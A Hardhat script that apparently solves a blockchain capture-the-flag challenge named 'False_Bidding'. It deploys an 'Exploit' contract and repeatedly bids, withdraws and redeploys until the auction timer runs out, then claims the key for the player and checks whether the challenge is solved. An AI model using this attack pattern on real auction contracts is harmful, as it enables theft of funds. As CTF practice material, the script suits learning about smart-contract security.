const hre = require("hardhat");
const { ethers, JsonRpcProvider } = require("ethers");

async function main() {

    const [deployer] = await hre.ethers.getSigners();

    const SETUP_ADDRESS = "0x6CCf7ABB48c134D01642450916A3C0b12C6C7Aa9";
    const PLAYER_ADDRESS = "0x7f5A2f6962151ab6b237a4b2246Bfac9D1fd9E52";

    // Get the contract instances
    const Setup = await hre.ethers.getContractFactory("contracts/False_Bidding/Setup.sol:Setup");
    const setupInstance = Setup.attach(SETUP_ADDRESS);

    // Interact with the Setup contract
    const AuctionHouseAddress = await setupInstance.TARGET();
    console.log(`AuctionHouse Address: ${AuctionHouseAddress}`);

    // Assuming Creature ABI is available
    const AuctionHouse = await hre.ethers.getContractFactory("contracts/False_Bidding/AuctionHouse.sol:AuctionHouse");
    const auctionHouseInstance = AuctionHouse.attach(AuctionHouseAddress);
    
    const AttackerContract = await hre.ethers.getContractFactory("contracts/False_Bidding/Solution/AttackerContract.sol:Exploit");
    let attackerContractInstance = await AttackerContract.deploy(auctionHouseInstance.getAddress());
    await attackerContractInstance.attack({value: hre.ethers.parseEther("1")});

    while(await auctionHouseInstance.timeout() != 0){
        console.log(await auctionHouseInstance.timeout());
        await attackerContractInstance.withdraw();
        attackerContractInstance = await AttackerContract.deploy(auctionHouseInstance.getAddress());
        await attackerContractInstance.attack({value: hre.ethers.parseEther("1")});
    }

    console.log("----------------------------------------")
    console.log("LAST ATTACK:")
    console.log("----------------------------------------")
    console.log(await attackerContractInstance.getAddress());
    topBidderadd = await auctionHouseInstance.topBidder();
    console.log("Top Bidder: ", topBidderadd[0]);
    console.log(await auctionHouseInstance.timeout());
    console.log(await auctionHouseInstance.keyOwner());
    await attackerContractInstance.claimKey(PLAYER_ADDRESS);
    console.log(await auctionHouseInstance.keyOwner());

    console.log(await setupInstance.isSolved(PLAYER_ADDRESS));
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });